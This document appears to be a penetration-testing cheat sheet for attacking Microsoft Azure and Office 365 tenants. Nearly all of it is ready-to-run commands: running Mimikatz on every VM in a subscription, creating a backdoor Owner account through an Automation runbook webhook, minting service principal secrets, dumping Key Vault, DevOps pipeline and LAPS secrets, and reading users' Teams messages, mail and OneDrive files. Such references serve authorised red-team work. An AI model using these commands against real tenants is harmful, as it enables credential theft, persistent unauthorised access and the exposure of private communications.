# Azure Services

## Virtual Machine

### RunCommand

> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as `NT Authority\System`

**Requirements**: 
* `Microsoft.Compute/virtualMachines/runCommand/action`

* List available Virtual Machines
    ```powershell
    PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
    ResourceGroupName    Name       
    -----------------    ----       
    TESTRESOURCES        Remote-Test
    ```

* Get Public IP of VM by querying the network interface
    ```powershell
    PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
    PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
    PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>
    ```

* Execute Powershell script on the VM, like `adduser`
    ```ps1
    PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
    PS Azure C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
    ```

* Finally you should be able to connect via WinRM
    ```ps1
    $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
    $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
    Enter-PSSession $sess
    ```

Against the whole subscription using `MicroBurst.ps1`

```powershell
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```


## Runbook

Runbook must be **SAVED** and **PUBLISHED** before running it.

### Create a Runbook

* Check user right for automation
    ```powershell
    az extension add --upgrade -n automation
    az automation account list # if it doesn't return anything the user is not a part of an Automation group
    az ad signed-in-user list-owned-objects
    ```
* Add the user to the "Automation" group: `Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose`
* Get the role of a user on the Automation account: `Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>`. NOTE: Contributor or higher privileges accounts can create and execute Runbooks
* List hybrid workers: `Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>`
* Create a Powershell Runbook: `Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose`
* Publish the Runbook: `Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`
* Start the Runbook: `Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`


### Persistence via Automation accounts

* Create a new Automation Account
    * "Create Azure Run As account": Yes
* Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
    * Sample runbook https://github.com/NetSPI/MicroBurst
    * Publish the runbook
    * Add a webhook to the runbook
* Add the AzureAD module to the Automation account
    * Update the Azure Automation Modules
* Assign "User Administrator" and "Subscription Owner" rights to the automation account
* Trigger the webhook with a post request to create the new user

    ```powershell
    $uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
    $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
    $body = ConvertTo-Json -InputObject $AccountInfo
    $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
    ```


## Service Principal

* Generate a new service principal password/secret
    ```ps1
    Import-Module Microsoft.Graph.Applications
    Connect-MgGraph 
    $servicePrincipalId = "<service-principal-id>"

    $params = @{
        passwordCredential = @{
            displayName = "NewCreds"
        }
    }
    Add-MgServicePrincipalPassword -ServicePrincipalId $servicePrincipalId -BodyParameter $params
    ```


## KeyVault

* Keyvault access token
    ```powershell
    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
    ```

* Connect with the access token
    ```ps1
    PS> $token = 'eyJ0..'
    PS> $keyvaulttoken = 'eyJ0..'
    PS> $accid = '2e...bc'
    PS Az> Connect-AzAccount -AccessToken $token -AccountId $accid -KeyVaultAccessToken $keyvaulttoken
    ```

* Query the vault and the secrets
    ```ps1
    PS Az> Get-AzKeyVault
    PS Az> Get-AzKeyVaultSecret -VaultName <VaultName>
    PS Az> Get-AzKeyVaultSecret -VaultName <VaultName> -Name Reader -AsPlainText
    ```


## Azure Storage Blob

* Blobs - `*.blob.core.windows.net`
* File Services - `*.file.core.windows.net`
* Data Tables - `*.table.core.windows.net`
* Queues - `*.queue.core.windows.net`

### Enumerate blobs

```powershell
PS > . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureBlobs.ps1
PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile azureblobs.txt
Found Storage Account -  redacted.blob.core.windows.net
```

### List and download blobs

```powershell
PS Az> Get-AzResource
PS Az> Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
PS Az> Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context
PS Az> Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob
```

### SAS URL

* Use [Storage Explorer](https://azure.microsoft.com/en-us/features/storage-explorer/)
* Click on **Open Connect Dialog** in the left menu. 
* Select **Blob container**. 
* On the **Select Authentication Method** page
    * Select **Shared access signature (SAS)** and click on Next
    * Copy the URL in **Blob container SAS URL** field.

:warning: You can also use `subscription`(username/password) to access storage resources such as blobs and files.


## Azure Web App

### SSH Connection

```powershell
az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-group <RG-NAME> -n <APP-SERVICE-NAME>
```


## Azure Devops

* Verify the validity of an Azure Personal Access Token (PAT)
    ```ps1
    PAT=""
    organization=""
    curl -u :${PAT} https://dev.azure.com/${organization}/_apis/build-release/builds
    ```

* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) - Nord Stream is a tool that allows you to extract secrets stored inside CI/CD environments by deploying malicious pipelines. It currently supports Azure DevOps, GitHub and GitLab.
    ```ps1
    # List all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

    # Dump all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg
    ```


## Microsoft Intune

* LAPS
    ```ps1
    #requires -modules Microsoft.Graph.Authentication
    #requires -modules Microsoft.Graph.Intune
    #requires -modules LAPS
    #requires -modules ImportExcel

    $DaysBack = 30
    Connect-MgGraph
    Get-IntuneManagedDevice -Filter "Platform eq 'Windows'" |
        Foreach-Object {Get-LapsAADPassword -DevicesIds $_.DisplayName} |
            Where-Object {$_.PasswordExpirationTime -lt (Get-Date).AddDays(-$DaysBack)} |
                Export-Excel -Path "c:\temp\lapsdata.xlsx" - ClearSheet -AutoSize -Show
    ```


## Office 365

### Microsoft Teams Messages

```ps1
TokenTacticsV2> RefreshTo-MSTeamsToken -domain domain.local
AADInternals> Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName
```


### Outlook Mails

* Read user mails
    ```ps1
    Get-MgUserMessage -UserId <user-id> | ft
    Get-MgUserMessageContent -OutFile mail.txt -UserId <user-id> -MessageId <message-id>
    ```

### OneDrive Files

```ps1
$userId = "<user-id>"
Import-Module Microsoft.Graph.Files
Get-MgUserDefaultDrive -UserId $userId
Get-MgUserDrive -UserId $UserId  -Debug
Get-MgDrive -top 1
```


## References

* [Microsoft Graph - servicePrincipal: addPassword](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword?view=graph-rest-1.0&tabs=powershell)
* [Microsoft Intune - Microsoft Intune support for Windows LAPS](https://learn.microsoft.com/en-us/mem/intune/protect/windows-laps-overview)
* [Pentesting Azure Mindmap - Alexis Danizan](https://github.com/synacktiv/Mindmaps)